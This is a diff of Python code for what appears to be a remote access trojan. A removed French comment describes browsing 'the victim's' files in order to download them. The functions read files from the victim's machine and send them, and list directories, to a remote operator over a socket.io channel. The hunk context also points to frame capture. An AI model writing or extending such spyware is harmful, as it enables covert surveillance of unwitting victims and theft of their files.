@@ -125,11 +125,8 @@ def gen_frames(sio):
         cv2.destroyAllWindows()
 
 
-# On doit pouvoir se balader dans les fichier de la victime pour télécharger un fichier donner
 def download_file(file_path, sio):
-    print(file_path)
     try:
-        # Ensure file_path is a string and correct path separators
         file_path = file_path.replace('/', '\\')
         if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
@@ -143,10 +140,16 @@ def download_file(file_path, sio):
         print(f"Échec de l'envoi du fichier: {e}")
 
 
-def list_directory(dir_path, sio):
+def list_dir(dir_path, sio):
+    files_and_dirs = []
     try:
         if os.path.exists(dir_path) and os.path.isdir(dir_path):
-            files_and_dirs = os.listdir(dir_path)
+            for file_name in os.listdir(dir_path):
+                file_path = os.path.join(dir_path, file_name)
+                if os.path.isfile(file_path):
+                    files_and_dirs.append({'name': file_name, 'type': 'file'})
+                elif os.path.isdir(file_path):
+                    files_and_dirs.append({'name': file_name, 'type': 'dir'})
             sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
             print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
         else:
